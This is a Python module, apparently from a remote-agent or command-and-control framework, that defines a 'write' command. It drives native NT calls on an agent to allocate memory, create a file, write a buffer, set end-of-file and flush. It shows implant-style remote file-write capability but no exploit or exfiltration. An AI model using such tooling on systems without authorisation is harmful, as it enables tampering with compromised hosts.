NAME = "write"
DESCRIPTION = "Write a buffer to a file"
PARAMS = [
    {"name":"file_name", "description":"The file name", "type":"str"},
    {"name":"data_buffer", "description":"Bytes buffer to write", "type":"bytes"},
    {"name":"byte_offset", "description":"Offset to write the file into", "type":"hex", "optional":True, "default":"0"},
]
DEPENDENCIES = ["NtCreateFile", "NtWriteFile", "NtClose", "NtAllocateVirtualMemory", "NtFreeVirtualMemory","set_eof", "NtFlushBuffersFile"]

def function(agent_id, args):
    #printf"[*][*][*][*][*][*][*][*][*][*][*][*]Write received args {args}")
    from services.orders import write_to_agent
    from services.binary import align_up
    file_name = "\\??\\" + args[0]
    data_buffer = args[1]
    buffer_size = align_up(len(data_buffer), 0x1000)
    byte_offset = args[2]
    ret = NtAllocateVirtualMemory(agent_id, [buffer_size, 0x04])
    buffer_ptr = ret["allocated_memory"]
    if ret["retval"] == 0:
        ret = NtCreateFile(agent_id, [file_name, 0xC0100000])
        if ret["retval"] == 0:
            file_handle = ret["FILE_HANDLE"]
            write_to_agent(agent_id, buffer_ptr, data_buffer)
            ret = NtWriteFile(agent_id, [file_handle, buffer_ptr, len(data_buffer), byte_offset])
            if ret["retval"] == 0:
                #printf"Len data_buffer = {len(data_buffer)}")
                ret = set_eof(agent_id, [file_handle, len(data_buffer)])
                ret = NtFlushBuffersFile(agent_id, [file_handle])
            NtClose(agent_id, [file_handle])
        else:
            return {"retval":"Error opening file"}
        NtFreeVirtualMemory(agent_id, [buffer_ptr, buffer_size])
        import hashlib
        return {"retval":0, "hash": hashlib.sha256(data_buffer).hexdigest()}
    else:
        return {"retval":"Error opening file"}